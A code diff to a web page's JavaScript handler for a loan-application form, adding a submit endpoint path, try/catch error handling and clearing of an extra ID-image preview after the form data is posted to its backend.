@@ -17,16 +17,24 @@ document.getElementById("loan-form").addEventListener("submit", async function (
     return;
   }
 
-  const response = await fetch("https://loanbackend-yg11.onrender.com", {
-    method: "POST",
-    body: data
-  });
+  try {
+    const response = await fetch("https://loanbackend-yg11.onrender.com/submit", {
+      method: "POST",
+      body: data
+    });
 
-  if (response.ok) {
-    document.getElementById("form-message").textContent =
-      "Your loan request has been received. Your credit limit will be sent via email or SMS. Please check regularly!";
-    form.reset();
-    document.getElementById("preview-front").src = "";
-    document.getElementById("preview-back").src = "";
+    if (response.ok) {
+      document.getElementById("form-message").textContent =
+        "Your loan request has been received. Your credit limit will be sent via email or SMS. Please check regularly!";
+      form.reset();
+      document.getElementById("preview-front").src = "";
+      document.getElementById("preview-back").src = "";
+      document.getElementById("preview-extra").src = "";
+    } else {
+      alert("Submission failed. Please try again.");
+    }
+  } catch (error) {
+    alert("An error occurred. Please try again.");
+    console.error(error);
   }
 });
